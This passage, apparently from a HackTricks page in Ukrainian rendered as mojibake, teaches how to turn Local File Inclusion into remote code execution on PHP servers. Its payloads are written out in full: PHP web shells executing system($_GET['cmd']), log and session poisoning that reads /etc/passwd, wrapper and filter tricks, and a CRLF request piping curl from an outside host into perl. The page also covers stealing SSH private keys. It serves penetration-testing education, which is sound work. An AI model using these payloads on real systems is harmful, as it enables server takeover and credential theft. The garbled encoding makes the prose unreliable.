–Ü–Ω—à—ñ –º–æ–∂–ª–∏–≤—ñ —à–ª—è—Ö–∏ –¥–æ –∂—É—Ä–Ω–∞–ª—ñ–≤:
```python
/var/log/apache2/access.log
/var/log/apache/access.log
/var/log/apache2/error.log
/var/log/apache/error.log
/usr/local/apache/log/error_log
/usr/local/apache2/log/error_log
/var/log/nginx/access.log
/var/log/nginx/error.log
/var/log/httpd/error_log
```
Fuzzing wordlist: [https://github.com/danielmiessler/SecLists/tree/master/Fuzzing/LFI](https://github.com/danielmiessler/SecLists/tree/master/Fuzzing/LFI)

### Via Email

**–ù–∞–¥—ñ—à–ª—ñ—Ç—å –ª–∏—Å—Ç–∞** –Ω–∞ –≤–Ω—É—Ç—Ä—ñ—à–Ω—ñ–π –∞–∫–∞—É–Ω—Ç (user@localhost), —â–æ –º—ñ—Å—Ç–∏—Ç—å –≤–∞—à PHP payload, –Ω–∞–ø—Ä–∏–∫–ª–∞–¥ `<?php echo system($_REQUEST["cmd"]); ?>`, —ñ —Å–ø—Ä–æ–±—É–π—Ç–µ –≤–∫–ª—é—á–∏—Ç–∏ –¥–æ –ª–∏—Å—Ç–∞ –∫–æ—Ä–∏—Å—Ç—É–≤–∞—á–∞ —à–ª—è—Ö–æ–º, —è–∫ **`/var/mail/<USERNAME>`** –∞–±–æ **`/var/spool/mail/<USERNAME>`**

### Via /proc/\*/fd/\*

1. –ó–∞–≤–∞–Ω—Ç–∞–∂—Ç–µ –±–∞–≥–∞—Ç–æ shell'—ñ–≤ (–Ω–∞–ø—Ä–∏–∫–ª–∞–¥: 100)
2. –í–∫–ª—é—á—ñ—Ç—å [http://example.com/index.php?page=/proc/$PID/fd/$FD](http://example.com/index.php?page=/proc/$PID/fd/$FD), –¥–µ $PID = PID –ø—Ä–æ—Ü–µ—Å—É (–º–æ–∂–Ω–∞ –ø–µ—Ä–µ–±—Ä–∞—Ç–∏) —ñ $FD - —Ñ–∞–π–ª–æ–≤–∏–π –¥–µ—Å–∫—Ä–∏–ø—Ç–æ—Ä (—Ç–∞–∫–æ–∂ –º–æ–∂–Ω–∞ –ø–µ—Ä–µ–±—Ä–∞—Ç–∏)

### Via /proc/self/environ

–Ø–∫ —Ñ–∞–π–ª –∂—É—Ä–Ω–∞–ª—É, –Ω–∞–¥—ñ—à–ª—ñ—Ç—å payload —É User-Agent, –≤—ñ–Ω –±—É–¥–µ –≤—ñ–¥–æ–±—Ä–∞–∂–µ–Ω–∏–π —É —Ñ–∞–π–ª—ñ /proc/self/environ
```
GET vulnerable.php?filename=../../../proc/self/environ HTTP/1.1
User-Agent: <?=phpinfo(); ?>
```
### Via upload

–Ø–∫—â–æ –≤–∏ –º–æ–∂–µ—Ç–µ –∑–∞–≤–∞–Ω—Ç–∞–∂–∏—Ç–∏ —Ñ–∞–π–ª, –ø—Ä–æ—Å—Ç–æ –≤—Å—Ç–∞–≤—Ç–µ –≤ –Ω—å–æ–≥–æ –æ–±–æ–ª–æ–Ω–∫—É (–Ω–∞–ø—Ä–∏–∫–ª–∞–¥: `<?php system($_GET['c']); ?>`).
```
http://example.com/index.php?page=path/to/uploaded/file.png
```
–©–æ–± –∑–±–µ—Ä–µ–≥—Ç–∏ —Ñ–∞–π–ª —á–∏—Ç–∞–±–µ–ª—å–Ω–∏–º, –Ω–∞–π–∫—Ä–∞—â–µ –≤–ø—Ä–æ–≤–∞–¥–∂—É–≤–∞—Ç–∏ –≤ –º–µ—Ç–∞–¥–∞–Ω—ñ –∑–æ–±—Ä–∞–∂–µ–Ω—å/doc/pdf

### –ó–∞–≤–∞–Ω—Ç–∞–∂–µ–Ω–Ω—è ZIP —Ñ–∞–π–ª—É

–ó–∞–≤–∞–Ω—Ç–∞–∂—Ç–µ ZIP —Ñ–∞–π–ª, —â–æ –º—ñ—Å—Ç–∏—Ç—å —Å—Ç–∏—Å–Ω—É—Ç–∏–π PHP shell, —ñ –æ—Ç—Ä–∏–º–∞–π—Ç–µ –¥–æ—Å—Ç—É–ø:
```python
example.com/page.php?file=zip://path/to/zip/hello.zip%23rce.php
```
### Via PHP sessions

–ü–µ—Ä–µ–≤—ñ—Ä—Ç–µ, —á–∏ –≤–∏–∫–æ—Ä–∏—Å—Ç–æ–≤—É—î –≤–µ–±-—Å–∞–π—Ç PHP Session (PHPSESSID)
```
Set-Cookie: PHPSESSID=i56kgbsq9rm8ndg3qbarhsbm27; path=/
Set-Cookie: user=admin; expires=Mon, 13-Aug-2018 20:21:29 GMT; path=/; httponly
```
–í PHP —Ü—ñ —Å–µ—Å—ñ—ó –∑–±–µ—Ä—ñ–≥–∞—é—Ç—å—Å—è —É _/var/lib/php5/sess\\_\[PHPSESSID]\_ —Ñ–∞–π–ª–∞—Ö
```
/var/lib/php5/sess_i56kgbsq9rm8ndg3qbarhsbm27.
user_ip|s:0:"";loggedin|s:0:"";lang|s:9:"en_us.php";win_lin|s:0:"";user|s:6:"admin";pass|s:6:"admin";
```
–í—Å—Ç–∞–Ω–æ–≤—ñ—Ç—å cookie –Ω–∞ `<?php system('cat /etc/passwd');?>`
```
login=1&user=<?php system("cat /etc/passwd");?>&pass=password&lang=en_us.php
```
–í–∏–∫–æ—Ä–∏—Å—Ç–æ–≤—É–π—Ç–µ LFI –¥–ª—è –≤–∫–ª—é—á–µ–Ω–Ω—è —Ñ–∞–π–ª—É —Å–µ—Å—ñ—ó PHP
```
login=1&user=admin&pass=password&lang=/../../../../../../../../../var/lib/php5/sess_i56kgbsq9rm8ndg3qbarhsbm2
```
### Via ssh

–Ø–∫—â–æ ssh –∞–∫—Ç–∏–≤–Ω–∏–π, –ø–µ—Ä–µ–≤—ñ—Ä—Ç–µ, —è–∫–∏–π –∫–æ—Ä–∏—Å—Ç—É–≤–∞—á –≤–∏–∫–æ—Ä–∏—Å—Ç–æ–≤—É—î—Ç—å—Å—è (/proc/self/status & /etc/passwd) —ñ —Å–ø—Ä–æ–±—É–π—Ç–µ –æ—Ç—Ä–∏–º–∞—Ç–∏ –¥–æ—Å—Ç—É–ø –¥–æ **\<HOME>/.ssh/id\_rsa**

### **Via** **vsftpd** _**logs**_

–õ–æ–≥–∏ –¥–ª—è FTP —Å–µ—Ä–≤–µ—Ä–∞ vsftpd –∑–Ω–∞—Ö–æ–¥—è—Ç—å—Å—è –∑–∞ –∞–¥—Ä–µ—Å–æ—é _**/var/log/vsftpd.log**_. –£ —Å—Ü–µ–Ω–∞—Ä—ñ—ó, –¥–µ —ñ—Å–Ω—É—î –≤—Ä–∞–∑–ª–∏–≤—ñ—Å—Ç—å Local File Inclusion (LFI), —ñ –¥–æ—Å—Ç—É–ø –¥–æ –≤—ñ–¥–∫—Ä–∏—Ç–æ–≥–æ —Å–µ—Ä–≤–µ—Ä–∞ vsftpd –º–æ–∂–ª–∏–≤–∏–π, –º–æ–∂–Ω–∞ —Ä–æ–∑–≥–ª—è–Ω—É—Ç–∏ –Ω–∞—Å—Ç—É–ø–Ω—ñ –∫—Ä–æ–∫–∏:

1. –í–ø—Ä–æ–≤–∞–¥—å—Ç–µ PHP payload —É –ø–æ–ª–µ —ñ–º–µ–Ω—ñ –∫–æ—Ä–∏—Å—Ç—É–≤–∞—á–∞ –ø—ñ–¥ —á–∞—Å –ø—Ä–æ—Ü–µ—Å—É –≤—Ö–æ–¥—É.
2. –ü—ñ—Å–ª—è –≤–ø—Ä–æ–≤–∞–¥–∂–µ–Ω–Ω—è –≤–∏–∫–æ—Ä–∏—Å—Ç–æ–≤—É–π—Ç–µ LFI –¥–ª—è –æ—Ç—Ä–∏–º–∞–Ω–Ω—è –ª–æ–≥—ñ–≤ —Å–µ—Ä–≤–µ—Ä–∞ –∑ _**/var/log/vsftpd.log**_.

### Via php base64 filter (using base64)

–Ø–∫ –ø–æ–∫–∞–∑–∞–Ω–æ –≤ [—Ü—å–æ–º—É](https://matan-h.com/one-lfi-bypass-to-rule-them-all-using-base64) —Å—Ç–∞—Ç—Ç—ñ, PHP base64 filter –ø—Ä–æ—Å—Ç–æ —ñ–≥–Ω–æ—Ä—É—î Non-base64. –í–∏ –º–æ–∂–µ—Ç–µ –≤–∏–∫–æ—Ä–∏—Å—Ç–æ–≤—É–≤–∞—Ç–∏ —Ü–µ, —â–æ–± –æ–±—ñ–π—Ç–∏ –ø–µ—Ä–µ–≤—ñ—Ä–∫—É —Ä–æ–∑—à–∏—Ä–µ–Ω–Ω—è —Ñ–∞–π–ª—É: —è–∫—â–æ –≤–∏ –Ω–∞–¥–∞—Å—Ç–µ base64, —è–∫–µ –∑–∞–∫—ñ–Ω—á—É—î—Ç—å—Å—è –Ω–∞ ".php", –≤–æ–Ω–æ –ø—Ä–æ—Å—Ç–æ —ñ–≥–Ω–æ—Ä—É–≤–∞—Ç–∏–º–µ "." —ñ –¥–æ–¥–∞—Å—Ç—å "php" –¥–æ base64. –û—Å—å –ø—Ä–∏–∫–ª–∞–¥ payload:
```url
http://example.com/index.php?page=PHP://filter/convert.base64-decode/resource=data://plain/text,PD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXSk7ZWNobyAnU2hlbGwgZG9uZSAhJzsgPz4+.php

NOTE: the payload is "<?php system($_GET['cmd']);echo 'Shell done !'; ?>"
```
### Via php filters (no file needed)

–¶–µ–π [**–æ–ø–∏—Å**](https://gist.github.com/loknop/b27422d355ea1fd0d90d6dbc1e278d4d) –ø–æ—è—Å–Ω—é—î, —â–æ –≤–∏ –º–æ–∂–µ—Ç–µ –≤–∏–∫–æ—Ä–∏—Å—Ç–æ–≤—É–≤–∞—Ç–∏ **php —Ñ—ñ–ª—å—Ç—Ä–∏ –¥–ª—è –≥–µ–Ω–µ—Ä–∞—Ü—ñ—ó –¥–æ–≤—ñ–ª—å–Ω–æ–≥–æ –∫–æ–Ω—Ç–µ–Ω—Ç—É** —è–∫ –≤–∏—Ö–æ–¥—É. –¶–µ –≤ –æ—Å–Ω–æ–≤–Ω–æ–º—É –æ–∑–Ω–∞—á–∞—î, —â–æ –≤–∏ –º–æ–∂–µ—Ç–µ **–≥–µ–Ω–µ—Ä—É–≤–∞—Ç–∏ –¥–æ–≤—ñ–ª—å–Ω–∏–π php –∫–æ–¥** –¥–ª—è –≤–∫–ª—é—á–µ–Ω–Ω—è **–±–µ–∑ –Ω–µ–æ–±—Ö—ñ–¥–Ω–æ—Å—Ç—ñ –∑–∞–ø–∏—Å—É–≤–∞—Ç–∏** –π–æ–≥–æ —É —Ñ–∞–π–ª.

{% content-ref url="lfi2rce-via-php-filters.md" %}
[lfi2rce-via-php-filters.md](lfi2rce-via-php-filters.md)
{% endcontent-ref %}

### Via segmentation fault

**–ó–∞–≤–∞–Ω—Ç–∞–∂—Ç–µ** —Ñ–∞–π–ª, —è–∫–∏–π –±—É–¥–µ –∑–±–µ—Ä–µ–∂–µ–Ω–æ —è–∫ **—Ç–∏–º—á–∞—Å–æ–≤–∏–π** —É `/tmp`, –ø–æ—Ç—ñ–º —É **—Ç–æ–º—É –∂ –∑–∞–ø–∏—Ç—ñ** –≤–∏–∫–ª–∏—á—Ç–µ **—Å–µ–≥–º–µ–Ω—Ç–∞—Ü—ñ–π–Ω—É –ø–æ–º–∏–ª–∫—É**, —ñ —Ç–æ–¥—ñ **—Ç–∏–º—á–∞—Å–æ–≤–∏–π —Ñ–∞–π–ª –Ω–µ –±—É–¥–µ –≤–∏–¥–∞–ª–µ–Ω–æ** —ñ –≤–∏ –∑–º–æ–∂–µ—Ç–µ –π–æ–≥–æ –∑–Ω–∞–π—Ç–∏.

{% content-ref url="lfi2rce-via-segmentation-fault.md" %}
[lfi2rce-via-segmentation-fault.md](lfi2rce-via-segmentation-fault.md)
{% endcontent-ref %}

### Via Nginx temp file storage

–Ø–∫—â–æ –≤–∏ –∑–Ω–∞–π—à–ª–∏ **Local File Inclusion** —ñ **Nginx** –ø—Ä–∞—Ü—é—î –ø–µ—Ä–µ–¥ PHP, –≤–∏ –º–æ–∂–µ—Ç–µ –æ—Ç—Ä–∏–º–∞—Ç–∏ RCE –∑–∞ –¥–æ–ø–æ–º–æ–≥–æ—é –Ω–∞—Å—Ç—É–ø–Ω–æ—ó —Ç–µ—Ö–Ω—ñ–∫–∏:

{% content-ref url="lfi2rce-via-nginx-temp-files.md" %}
[lfi2rce-via-nginx-temp-files.md](lfi2rce-via-nginx-temp-files.md)
{% endcontent-ref %}

### Via PHP\_SESSION\_UPLOAD\_PROGRESS

–Ø–∫—â–æ –≤–∏ –∑–Ω–∞–π—à–ª–∏ **Local File Inclusion**, –Ω–∞–≤—ñ—Ç—å —è–∫—â–æ —É –≤–∞—Å **–Ω–µ–º–∞—î —Å–µ—Å—ñ—ó** —ñ `session.auto_start` –≤–∏–º–∫–Ω–µ–Ω–æ. –Ø–∫—â–æ –≤–∏ –Ω–∞–¥–∞—Å—Ç–µ **`PHP_SESSION_UPLOAD_PROGRESS`** —É **multipart POST** –¥–∞–Ω–∏—Ö, PHP **–≤–∫–ª—é—á–∏—Ç—å —Å–µ—Å—ñ—é –¥–ª—è –≤–∞—Å**. –í–∏ –º–æ–∂–µ—Ç–µ –∑–ª–æ–≤–∂–∏–≤–∞—Ç–∏ —Ü–∏–º, —â–æ–± –æ—Ç—Ä–∏–º–∞—Ç–∏ RCE:

{% content-ref url="via-php_session_upload_progress.md" %}
[via-php\_session\_upload\_progress.md](via-php\_session\_upload\_progress.md)
{% endcontent-ref %}

### Via temp file uploads in Windows

–Ø–∫—â–æ –≤–∏ –∑–Ω–∞–π—à–ª–∏ **Local File Inclusion** —ñ —Å–µ—Ä–≤–µ—Ä –ø—Ä–∞—Ü—é—î –≤ **Windows**, –≤–∏ –º–æ–∂–µ—Ç–µ –æ—Ç—Ä–∏–º–∞—Ç–∏ RCE:

{% content-ref url="lfi2rce-via-temp-file-uploads.md" %}
[lfi2rce-via-temp-file-uploads.md](lfi2rce-via-temp-file-uploads.md)
{% endcontent-ref %}

### Via `pearcmd.php` + URL args

–Ø–∫ [**–ø–æ—è—Å–Ω–µ–Ω–æ –≤ —Ü—å–æ–º—É –ø–æ—Å—Ç—ñ**](https://www.leavesongs.com/PENETRATION/docker-php-include-getshell.html#0x06-pearcmdphp), —Å–∫—Ä–∏–ø—Ç `/usr/local/lib/phppearcmd.php` —ñ—Å–Ω—É—î –∑–∞ –∑–∞–º–æ–≤—á—É–≤–∞–Ω–Ω—è–º —É php docker –æ–±—Ä–∞–∑–∞—Ö. –ë—ñ–ª—å—à–µ —Ç–æ–≥–æ, –º–æ–∂–ª–∏–≤–æ –ø–µ—Ä–µ–¥–∞–≤–∞—Ç–∏ –∞—Ä–≥—É–º–µ–Ω—Ç–∏ –¥–æ —Å–∫—Ä–∏–ø—Ç–∞ —á–µ—Ä–µ–∑ URL, –æ—Å–∫—ñ–ª—å–∫–∏ –≤–∫–∞–∑–∞–Ω–æ, —â–æ —è–∫—â–æ –ø–∞—Ä–∞–º–µ—Ç—Ä URL –Ω–µ –º–∞—î `=`, –π–æ–≥–æ —Å–ª—ñ–¥ –≤–∏–∫–æ—Ä–∏—Å—Ç–æ–≤—É–≤–∞—Ç–∏ —è–∫ –∞—Ä–≥—É–º–µ–Ω—Ç.

–ù–∞—Å—Ç—É–ø–Ω–∏–π –∑–∞–ø–∏—Ç —Å—Ç–≤–æ—Ä—é—î —Ñ–∞–π–ª —É `/tmp/hello.php` –∑ –≤–º—ñ—Å—Ç–æ–º `<?=phpinfo()?>`:

{% code overflow="wrap" %}
```bash
GET /index.php?+config-create+/&file=/usr/local/lib/php/pearcmd.php&/<?=phpinfo()?>+/tmp/hello.php HTTP/1.1
```
{% endcode %}

–ù–∞—Å—Ç—É–ø–Ω–µ –∑–ª–æ–≤–∂–∏–≤–∞—î –≤—Ä–∞–∑–ª–∏–≤—ñ—Å—Ç—é CRLF –¥–ª—è –æ—Ç—Ä–∏–º–∞–Ω–Ω—è RCE (–∑ [**—Ç—É—Ç**](https://blog.orange.tw/2024/08/confusion-attacks-en.html?m=1)):
```
http://server/cgi-bin/redir.cgi?r=http:// %0d%0a
Location:/ooo? %2b run-tests %2b -ui %2b $(curl${IFS}orange.tw/x|perl) %2b alltests.php %0d%0a
Content-Type:proxy:unix:/run/php/php-fpm.sock|fcgi://127.0.0.1/usr/local/lib/php/pearcmd.php %0d%0a
%0d%0a
```
### –ß–µ—Ä–µ–∑ phpinfo() (file\_uploads = on)

–Ø–∫—â–æ –≤–∏ –∑–Ω–∞–π—à–ª–∏ **Local File Inclusion** —ñ —Ñ–∞–π–ª, —â–æ –ø–æ–∫–∞–∑—É—î **phpinfo()** –∑ file\_uploads = on, –≤–∏ –º–æ–∂–µ—Ç–µ –æ—Ç—Ä–∏–º–∞—Ç–∏ RCE:

{% content-ref url="lfi2rce-via-phpinfo.md" %}
[lfi2rce-via-phpinfo.md](lfi2rce-via-phpinfo.md)
{% endcontent-ref %}

### –ß–µ—Ä–µ–∑ compress.zlib + `PHP_STREAM_PREFER_STUDIO` + –í–∏—Ç—ñ–∫ —à–ª—è—Ö—É

–Ø–∫—â–æ –≤–∏ –∑–Ω–∞–π—à–ª–∏ **Local File Inclusion** —ñ –≤–∏ **–º–æ–∂–µ—Ç–µ –µ–∫—Å—Ñ—ñ–ª—å—Ç—Ä—É–≤–∞—Ç–∏ —à–ª—è—Ö** –¥–æ —Ç–∏–º—á–∞—Å–æ–≤–æ–≥–æ —Ñ–∞–π–ª—É, –ê–õ–ï **—Å–µ—Ä–≤–µ—Ä** **–ø–µ—Ä–µ–≤—ñ—Ä—è—î**, —á–∏ **—Ñ–∞–π–ª, —â–æ –≤–∫–ª—é—á–∞—î—Ç—å—Å—è, –º–∞—î PHP –º—ñ—Ç–∫–∏**, –≤–∏ –º–æ–∂–µ—Ç–µ —Å–ø—Ä–æ–±—É–≤–∞—Ç–∏ **–æ–±—ñ–π—Ç–∏ —Ü—é –ø–µ—Ä–µ–≤—ñ—Ä–∫—É** –∑–∞ –¥–æ–ø–æ–º–æ–≥–æ—é —Ü—å–æ–≥–æ **Race Condition**:

{% content-ref url="lfi2rce-via-compress.zlib-+-php_stream_prefer_studio-+-path-disclosure.md" %}
[lfi2rce-via-compress.zlib-+-php\_stream\_prefer\_studio-+-path-disclosure.md](lfi2rce-via-compress.zlib-+-php\_stream\_prefer\_studio-+-path-disclosure.md)
{% endcontent-ref %}

### –ß–µ—Ä–µ–∑ –≤—ñ—á–Ω–µ –æ—á—ñ–∫—É–≤–∞–Ω–Ω—è + –±—Ä—É—Ç—Ñ–æ—Ä—Å

–Ø–∫—â–æ –≤–∏ –º–æ–∂–µ—Ç–µ –∑–ª–æ–≤–∂–∏–≤–∞—Ç–∏ LFI –¥–ª—è **–∑–∞–≤–∞–Ω—Ç–∞–∂–µ–Ω–Ω—è —Ç–∏–º—á–∞—Å–æ–≤–∏—Ö —Ñ–∞–π–ª—ñ–≤** —ñ –∑–º—É—Å–∏—Ç–∏ —Å–µ—Ä–≤–µ—Ä **–∑–∞–≤–∏—Å–Ω—É—Ç–∏** –≤–∏–∫–æ–Ω–∞–Ω–Ω—è PHP, –≤–∏ –º–æ–≥–ª–∏ –± —Ç–æ–¥—ñ **–±—Ä—É—Ç—Ñ–æ—Ä—Å–∏—Ç–∏ —ñ–º–µ–Ω–∞ —Ñ–∞–π–ª—ñ–≤ –ø—Ä–æ—Ç—è–≥–æ–º –≥–æ–¥–∏–Ω**, —â–æ–± –∑–Ω–∞–π—Ç–∏ —Ç–∏–º—á–∞—Å–æ–≤–∏–π —Ñ–∞–π–ª:

{% content-ref url="lfi2rce-via-eternal-waiting.md" %}
[lfi2rce-via-eternal-waiting.md](lfi2rce-via-eternal-waiting.md)
{% endcontent-ref %}

### –î–æ –§–∞—Ç–∞–ª—å–Ω–æ—ó –ü–æ–º–∏–ª–∫–∏

–Ø–∫—â–æ –≤–∏ –≤–∫–ª—é—á–∏—Ç–µ –±—É–¥—å-—è–∫–∏–π –∑ —Ñ–∞–π–ª—ñ–≤ `/usr/bin/phar`, `/usr/bin/phar7`, `/usr/bin/phar.phar7`, `/usr/bin/phar.phar`. (–í–∞–º –ø–æ—Ç—Ä—ñ–±–Ω–æ –≤–∫–ª—é—á–∏—Ç–∏ —Ç–æ–π —Å–∞–º–∏–π —Ñ–∞–π–ª 2 —Ä–∞–∑–∏, —â–æ–± –≤–∏–∫–ª–∏–∫–∞—Ç–∏ —Ü—é –ø–æ–º–∏–ª–∫—É).

**–Ø –Ω–µ –∑–Ω–∞—é, —è–∫ —Ü–µ –∫–æ—Ä–∏—Å–Ω–æ, –∞–ª–µ —Ü–µ –º–æ–∂–µ –±—É—Ç–∏.**\
_–ù–∞–≤—ñ—Ç—å —è–∫—â–æ –≤–∏ –≤–∏–∫–ª–∏–∫–∞—î—Ç–µ PHP –§–∞—Ç–∞–ª—å–Ω—É –ü–æ–º–∏–ª–∫—É, —Ç–∏–º—á–∞—Å–æ–≤—ñ —Ñ–∞–π–ª–∏ PHP, —â–æ –∑–∞–≤–∞–Ω—Ç–∞–∂—É—é—Ç—å—Å—è, –≤–∏–¥–∞–ª—è—é—Ç—å—Å—è._

<figure><img src="../../.gitbook/assets/image (1031).png" alt=""><figcaption></figcaption></figure>

## –ü–æ—Å–∏–ª–∞–Ω–Ω—è

* [PayloadsAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/File%20Inclusion%20-%20Path%20Traversal)\\
* [PayloadsAllTheThings/tree/master/File%20Inclusion%20-%20Path%20Traversal/Intruders](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/File%20Inclusion%20-%20Path%20Traversal/Intruders)

{% file src="../../.gitbook/assets/EN-Local-File-Inclusion-1.pdf" %}

<figure><img src="../../.gitbook/assets/image (380).png" alt=""><figcaption></figcaption></figure>

–ü—Ä–∏—î–¥–Ω—É–π—Ç–µ—Å—å –¥–æ [**HackenProof Discord**](https://discord.com/invite/N3FrSbmwdy) —Å–µ—Ä–≤–µ—Ä–∞, —â–æ–± —Å–ø—ñ–ª–∫—É–≤–∞—Ç–∏—Å—è –∑ –¥–æ—Å–≤—ñ–¥—á–µ–Ω–∏–º–∏ —Ö–∞–∫–µ—Ä–∞–º–∏ —Ç–∞ —à—É–∫–∞—á–∞–º–∏ –≤—Ä–∞–∑–ª–∏–≤–æ—Å—Ç–µ–π!

**–Ü–Ω—Å–∞–π—Ç–∏ –∑ —Ö–∞–∫—ñ–Ω–≥—É**\
–ó–∞–ª—É—á–∞–π—Ç–µ—Å—è –¥–æ –∫–æ–Ω—Ç–µ–Ω—Ç—É, —è–∫–∏–π –∑–∞–Ω—É—Ä—é—î—Ç—å—Å—è –≤ –∑–∞—Ö–æ–ø–ª–µ–Ω–Ω—è —Ç–∞ –≤–∏–∫–ª–∏–∫–∏ —Ö–∞–∫—ñ–Ω–≥—É

**–ù–æ–≤–∏–Ω–∏ –ø—Ä–æ —Ö–∞–∫—ñ–Ω–≥ –≤ —Ä–µ–∞–ª—å–Ω–æ–º—É —á–∞—Å—ñ**\
–°–ª—ñ–¥–∫—É–π—Ç–µ –∑–∞ —à–≤–∏–¥–∫–æ–ø–ª–∏–Ω–Ω–∏–º —Å–≤—ñ—Ç–æ–º —Ö–∞–∫—ñ–Ω–≥—É —á–µ—Ä–µ–∑ –Ω–æ–≤–∏–Ω–∏ —Ç–∞ —ñ–Ω—Å–∞–π—Ç–∏ –≤ —Ä–µ–∞–ª—å–Ω–æ–º—É —á–∞—Å—ñ

**–û—Å—Ç–∞–Ω–Ω—ñ –æ–≥–æ–ª–æ—à–µ–Ω–Ω—è**\
–ë—É–¥—å—Ç–µ –≤ –∫—É—Ä—Å—ñ –Ω–æ–≤–∏—Ö –ø—Ä–æ–≥—Ä–∞–º –≤–∏–Ω–∞–≥–æ—Ä–æ–¥ –∑–∞ –≤—Ä–∞–∑–ª–∏–≤–æ—Å—Ç—ñ —Ç–∞ –≤–∞–∂–ª–∏–≤–∏—Ö –æ–Ω–æ–≤–ª–µ–Ω—å –ø–ª–∞—Ç—Ñ–æ—Ä–º

**–ü—Ä–∏—î–¥–Ω—É–π—Ç–µ—Å—å –¥–æ –Ω–∞—Å –Ω–∞** [**Discord**](https://discord.com/invite/N3FrSbmwdy) —ñ –ø–æ—á–Ω—ñ—Ç—å —Å–ø—ñ–≤–ø—Ä–∞—Ü—é–≤–∞—Ç–∏ –∑ –ø—Ä–æ–≤—ñ–¥–Ω–∏–º–∏ —Ö–∞–∫–µ—Ä–∞–º–∏ –≤–∂–µ —Å—å–æ–≥–æ–¥–Ω—ñ!

{% hint style="success" %}
–í—á—ñ—Ç—å—Å—è —Ç–∞ –ø—Ä–∞–∫—Ç–∏–∫—É–π—Ç–µ Hacking AWS:<img src="../../.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="../../.gitbook/assets/arte.png" alt="" data-size="line">\
–í—á—ñ—Ç—å—Å—è —Ç–∞ –ø—Ä–∞–∫—Ç–∏–∫—É–π—Ç–µ Hacking GCP: <img src="../../.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="../../.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>–ü—ñ–¥—Ç—Ä–∏–º–∞—Ç–∏ HackTricks</summary>

* –ü–µ—Ä–µ–≤—ñ—Ä—Ç–µ [**–ø–ª–∞–Ω–∏ –ø—ñ–¥–ø–∏—Å–∫–∏**](https://github.com/sponsors/carlospolop)!
* **–ü—Ä–∏—î–¥–Ω—É–π—Ç–µ—Å—å –¥–æ** üí¨ [**–≥—Ä—É–ø–∏ Discord**](https://discord.gg/hRep4RUj7f) –∞–±–æ [**–≥—Ä—É–ø–∏ –≤ —Ç–µ–ª–µ–≥—Ä–∞–º—ñ**](https://t.me/peass) –∞–±–æ **—Å–ª—ñ–¥–∫—É–π—Ç–µ** –∑–∞ –Ω–∞–º–∏ –≤ **Twitter** üê¶ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **–î—ñ–ª—ñ—Ç—å—Å—è —Ö–∞–∫–µ—Ä—Å—å–∫–∏–º–∏ —Ç—Ä—é–∫–∞–º–∏, –Ω–∞–¥—Å–∏–ª–∞—é—á–∏ PR –¥–æ** [**HackTricks**](https://github.com/carlospolop/hacktricks) —Ç–∞ [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) —Ä–µ–ø–æ–∑–∏—Ç–æ—Ä—ñ—ó–≤ –Ω–∞ github.

</details>
{% endhint %}
